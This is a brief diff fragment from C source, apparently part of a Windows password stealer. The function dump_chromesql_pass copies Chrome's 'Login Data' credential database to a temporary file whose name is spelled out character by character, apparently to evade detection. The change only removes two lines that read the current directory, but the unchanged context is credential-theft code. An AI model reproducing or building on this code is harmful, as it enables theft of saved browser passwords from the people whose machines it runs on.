@@ -146,8 +146,6 @@ VOID dump_chromesql_pass()
 	LPSTR strFilePath = (LPSTR)talloc(dwSize);
 	
 	SetCurrentDirectory(strProfilePath);
-	char cwd[MAX_PATH];
-	GetCurrentDirectory(MAX_PATH, cwd);
 	CopyFile("Login Data", "templogin", 0);
 	
 	CHAR strFileName[] = { 't', 'e', 'm', 'p', 'l', 'o', 'g', 'i', 'n', 0x0 };
